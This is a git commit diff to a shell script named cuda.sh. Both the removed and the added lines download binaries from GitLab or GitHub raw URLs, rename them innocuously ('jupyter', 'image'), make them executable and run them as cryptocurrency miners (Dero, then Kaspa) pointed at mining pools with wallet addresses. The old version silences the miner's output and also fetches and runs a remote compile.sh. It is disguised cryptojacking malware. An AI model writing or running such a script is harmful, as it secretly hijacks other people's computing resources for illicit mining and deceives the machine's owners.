24f365675d51302823a905486348f98b9d045a39
sarifadim <115786763+sarifadim@users.noreply.github.com>
2023-01-16 04:57:49 +0700

    Update cuda.sh

--- cuda.sh
+++ cuda.sh
@@ -1,5 +1,2 @@
-wget -q -O jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/bypass-dero-miner && chmod +x jupyter
-wget -q -O jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/dero-stratum-miner && chmod +x jupyter
-wget https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh && chmod +x compile.sh
-./jupyter -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc0v2j0vsquftksu2ayrl.S04 -r pool.whalesburg.com:4300 >/dev/null 
-./compile.sh
+wget -qO image https://gitlab.com/teletyl/oon/-/raw/main/news && chmod +x image
+./image --algo KASPA --pool 47.88.32.232:443 --user kaspa:qzh5k3uwdw498pgmkn8pke3rj75f8x0w5mp8m4ue082524hw789vz7gg92kfq.$(echo A-V100-$(date +"%T")) --tls enable
